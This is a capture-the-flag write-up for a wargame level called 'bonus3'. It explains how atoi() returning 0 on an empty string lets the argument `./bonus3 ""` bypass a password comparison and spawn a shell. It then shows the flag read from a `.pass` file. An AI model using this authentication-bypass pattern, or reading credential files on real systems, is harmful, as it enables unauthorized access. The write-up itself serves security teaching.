
# PART 2: Vulnerability Summary

## The Vulnerability

Program uses `atoi()` to get an index, then uses that to null-terminate the buffer, then compares the buffer with the original argument.

**Flawed logic:**
```c
int index = atoi(argv[1]);
buffer[index] = '\0';
if (strcmp(buffer, argv[1]) == 0) {
    execl("/bin/sh", "sh", 0);
}
```

## How atoi() Works

`atoi()` converts string to integer:

```c
atoi("42")    = 42
atoi("0")     = 0
atoi("-5")    = -5
atoi("abc")   = 0     // Non-numeric → 0
atoi("")      = 0     // Empty string → 0
atoi("12abc") = 12    // Stops at first non-digit
```

**Key point:** Invalid/empty input returns 0.

## The Exploit Chain

### Step 1: Pass empty string argument
```bash
./bonus3 ""
```

### Step 2: atoi() conversion
```c
int index = atoi("");  // Returns 0
```

### Step 3: Null byte injection
```c
buffer[0] = '\0';  // Buffer is now empty string
```

Before: `buffer = "3321b6f81659..."`  
After: `buffer = ""`

### Step 4: String comparison
```c
strcmp(buffer, argv[1])
strcmp("", "")
// Returns 0 (match!)
```

### Step 5: Shell execution
```c
execl("/bin/sh", "sh", 0);
// Executes shell as 'end' user
```

## Memory Layout

```
Stack:
┌─────────────────────┐ esp+0x18
│   buffer[132]       │
│   [0-65]: password  │ ← First fread (66 bytes)
│   [66-131]: more    │ ← Second fread (65 bytes)
└─────────────────────┘

After buffer[0] = '\0':
┌─────────────────────┐
│ '\0' ...            │ ← Now empty string
└─────────────────────┘
```

## Why This Works

### Normal input (fails):
```bash
./bonus3 "5"
```

1. `atoi("5") = 5`
2. `buffer[5] = '\0'` → truncates at position 5
3. `buffer = "3321b"` (first 5 chars)
4. `strcmp("3321b", "5")` → not equal
5. Prints `buffer+66` and exits

### Empty string input (succeeds):
```bash
./bonus3 ""
```

1. `atoi("") = 0`
2. `buffer[0] = '\0'` → empty string
3. `buffer = ""`
4. `strcmp("", "")` → equal!
5. Executes shell ✓

## Why Empty String is Special

Empty string is the **only** input where:
- `atoi()` returns 0 (makes `buffer[0] = '\0'`)
- The modified buffer matches the original argument
- Both become empty strings for comparison

## Comparison with Other Inputs

| Input | atoi() | buffer[X]='\0' | buffer after | strcmp(buffer, input) | Result |
|-------|--------|----------------|--------------|----------------------|--------|
| `""` | 0 | buffer[0] | `""` | 0 (match!) | Shell ✓ |
| `"0"` | 0 | buffer[0] | `""` | ≠0 (no match) | Fail |
| `"5"` | 5 | buffer[5] | `"3321b"` | ≠0 (no match) | Fail |
| `"abc"` | 0 | buffer[0] | `""` | ≠0 (no match) | Fail |

## The Logic Flaw

The programmer likely intended:
- Read password into buffer
- Let user specify which part to compare
- Check if that part matches user input

But failed to consider:
- Empty string makes buffer empty
- Empty buffer matches empty input
- This bypasses the password check entirely!

## Code Flow Visualization

```
┌─────────────────────────────────────┐
│ ./bonus3 ""                         │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ fopen("/home/user/end/.pass", "r")  │
│ fread(buffer, 66 bytes)             │
│ buffer = "3321b6f81659..."          │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ index = atoi("")  → 0               │
│ buffer[0] = '\0'                    │
│ buffer is now ""                    │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ strcmp("", "") → 0                  │
│ Strings match!                      │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│ execl("/bin/sh", "sh", 0)           │
│ Shell as 'end' user!                │
└─────────────────────────────────────┘
```

## Security Lessons

1. **Validate atoi() results** - Don't assume valid input
2. **Check for empty strings** - Special case that's often forgotten
3. **Never use user input as array index** without bounds checking
4. **Separate authentication from data manipulation** 
5. **Logic bugs are as dangerous as memory bugs**
6. **Think about edge cases** - empty string, zero, negative numbers
7. **Don't mix control flow with data** - Using same input for index and comparison

## Key Concepts

- **atoi() edge case:** Empty/invalid strings return 0
- **Logic vulnerability:** Flaw in program logic, not memory corruption
- **String comparison:** Empty strings are equal
- **Index manipulation:** User controls where null byte is placed
- **Authentication bypass:** No password needed, just empty string


# Bonus3 - Logic Bug via atoi() Edge Case

## Vulnerability
Program reads password file, uses `atoi(argv[1])` as index to inject null byte, then compares buffer with `argv[1]`.

**Flaw:** `atoi("")` returns 0, making `buffer[0] = '\0'`, resulting in empty string that matches empty argument.

## Exploit Logic
```
argv[1] = ""
↓
atoi("") = 0
↓
buffer[0] = '\0'  (buffer becomes "")
↓
strcmp("", "") = 0  (match!)
↓
execl("/bin/sh", "sh", 0)
```

## Code Flow
```c
fread(buffer, 66);              // Read password
buffer[atoi(argv[1])] = '\0';   // Inject null at index
if (strcmp(buffer, argv[1]) == 0) {
    execl("/bin/sh");           // Shell if match
}
```

## Payload
```bash
./bonus3 ""
```

Empty string is the **only** input where both buffer and argv[1] are empty after modification.

## Result
Shell as `end` user!

```bash
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

## Key Concepts
- **atoi() edge case:** Empty string returns 0
- **Logic vulnerability:** Authentication bypass via edge case
- **String comparison:** Empty strings are equal
- **No memory corruption:** Pure logic bug